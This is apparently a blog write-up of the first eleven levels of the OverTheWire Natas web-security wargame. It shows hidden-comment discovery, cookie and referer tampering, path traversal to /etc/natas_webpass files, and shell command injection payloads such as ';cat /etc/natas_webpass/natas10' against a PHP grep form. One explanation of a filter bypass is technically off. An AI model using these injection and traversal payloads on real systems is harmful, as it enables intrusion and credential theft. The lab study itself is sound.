---
layout:     post
title:      "Overthewire.org - Natas"
subtitle:   "Write-Up Part 1"
date:       2016-12-25 0:00:00
author:     "W3ndige"
header-img: "img/overthewire-header.png"
category: Write-Ups
---

<h1>Introduction</h1>

<p>Welcome back to another OverTheWire wargame called "Leviathan" - which is made only of tasks connected to web security. As the number of exercises is very big (33 at the time of publishing this post), I will break it down in a few smaller parts. Without wasting your time, let's get started! </p>

<h1>0</h1>

<p>Firstly, we are greeted with this message: </p>
<pre>You can find the password for the next level on this page.</pre>
<p>As you may suspect, password is hidden somewhere in the source code of the website. Let's take a look: </p>
{%highlight html%}
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is *********************** -->
</div>
{% endhighlight %}

<p>There it is, commented out. Now let's jump into the next level.</p>


<h1>1</h1>

<p>This time we have more 'serious' protection going on.</p>
<pre>You can find the password for the next level on this page, but rightclicking has been blocked!</pre>
<p>One of the ways to bypass this protection, is to enter <b>view-source:</b> before the URL of the website. </p>

{%highlight html%}
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is *********************** -->
</div>
{% endhighlight %}

<h1>2</h1>

<p>This time, we have to look somewhere outside of the source code. </p>
<pre>There is nothing on this page</pre>

<p>The first thing that comes to my mind is <b>robots.txt</b> - they sometimes contain very useful information. Unfortunately, it did not work out this time. But there was something that concerned me. </p>

{%highlight html%}
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
{% endhighlight %}

<p>What is this <b>pixel.png</b>? It's in the directory called files, maybe we'll find something more useful there.</p>

<p>Great, apart from pixel.png we have <b>users.txt</b> containing pass for the next one!</p>

<pre>
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:***********************
eve:zo4mJWyNj2
mallory:9urtcpzBmH
</pre>

<h1>3</h1>

<p>Once again: </p>
<pre>There is nothing on this page</pre>

<p>But!</p>
<p>This time we have a clue in <b>robots.txt</b>. I knew it will help at some point!</p>
<pre>
User-agent: *
Disallow: /s3cr3t/
</pre>

<p>Going under this directory lets us view another users.txt with password to the next one. </p>
<pre>
natas4:***********************
</pre>

<h1>4</h1>

<p>Oh, something new!</p>
<pre>Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"</pre>

<p>It must be something with HTTP referer, changing it's property (spoofing) may allow me to enter. </p>

<p>After quick googling, I came up with this plugin for Chrome - <a href="https://chrome.google.com/webstore/detail/referer-control/acehenlbileblompmkkoimgobmcdkgeb">Referer Control</a>. After changing the referer to this, provided in instructions, and refreshing the page I got the pass to the next one. </p>

<pre>
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
</pre>

<h1>5</h1>

<p>But, how can I log in? :D</p>

<pre>Access disallowed. You are not logged in</pre>

<p>Actually, this level was very easy - using <a href="http://www.editthiscookie.com/">EditThisCookie</a> I was able to change the value of loggedin cookie from 0 to 1, resulting in ability to view the password. </p>

<pre>
Access granted. The password for natas6 is ***********************
</pre>

<h1>6</h1>

<p>This time we've got simple form, with ability to view it's source code. </p>

{%highlight php%}
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
{% endhighlight %}

<p>Actually, we don't have to analyze whole code, what's essential is the <b>include</b> part and since <b>$secret</b> is assigned nowhere in this code I can assume, that it's in the secret.inc file. Let's check it!</p>

{%highlight php%}
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
{% endhighlight %}

<p>Now last thing is to enter the secret into the input form. </p>
<p>Great, it works!</p>

<pre>
Access granted. The password for natas7 is ***********************
</pre>

<h1>7</h1>

<p>In this level we have simple structure of the website - clicking the elements in the menu changes the content of the website. </p>

{%highlight html%}
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
{% endhighlight %}

<p>Ok, we have this hint. Let's try to break this system and get access to /etc/natas_webpass/natas8</p>

<p>Actualy I didn't have to break it, simple entering this in URL like <b>index.php?page=/etc/natas_webpass/natas8</b> allowed me to view the file. </p>

<pre>
***********************
</pre>

<h1>8</h1>

<p>Another level, another form.</p>

{%highlight php%}

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
{% endhighlight %}

<p>Let's break down this process - firstly script takes input entered in form, then with function <b>encodeSecret</b> it converts binary to hex, reverses this string and encodes with base64. What we have to do here is to reverse this process, which can be done with php. </p>

{%highlight bash%}
w3ndige@w3ndige ~ $ php -r 'echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")));'
{% endhighlight %}

<p>This one liner produces the correct secret, which after entering into the form gives pass to the nex level. </p>

<pre>
Access granted. The password for natas9 is ***********************
</pre>

<h1>9</h1>

<p>This time we have something new - form searching in an dictionary. Let's check the source code. </p>

{%highlight php%}
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
{% endhighlight %}

<p>Actually, what this script does is very dangerous. We know that grep is command line function searching through the text files. But what, if we have entered semicolon and then another command? Acutally, you can see it working by entering <b>;ls- la</b> in search form.  </p>

{%highlight bash%}
-rw-r----- 1 natas9 natas9 460878 Jun 25  2016 dictionary.txt
{% endhighlight %}

<p>Great, lets view the password by entering ;cat /etc/natas_webpass/natas10/, as it's also location of all passwords, which was stated in the beginning. </p>

<pre>
Output:
***********************

African
Africans
Allah
Allah's
</pre>

<p>Let's move to the next one!</p>

<h1>10</h1>

<p>This time we have the updated version of the script from the last one, filtering for certain characters.  </p>

{%highlight bash%}
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
{% endhighlight %}

<p>We have to find the way to execute this commands in a different way. And actually, after learning a lot about PHP I remembered that <b>.</b> concatenates 2 strings. So let's do this: <b>. /etc/natas_webpass/natas11</b></p>

<p>Which actually produces the output! I tried to do this also with HTML entities firstly, but unfortunately it did not work out.  </p>

<pre>
/etc/natas_webpass/natas11:***********************
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
</pre>

<hr>

<p>And that's the point where I had to end this part of Natas exercises. I'll come back soon with another part, as they are really interesting and completely different from others at OverTheWire. </p>

<p>See you in the next one!</p>

<p>~ Stay safe!</p>
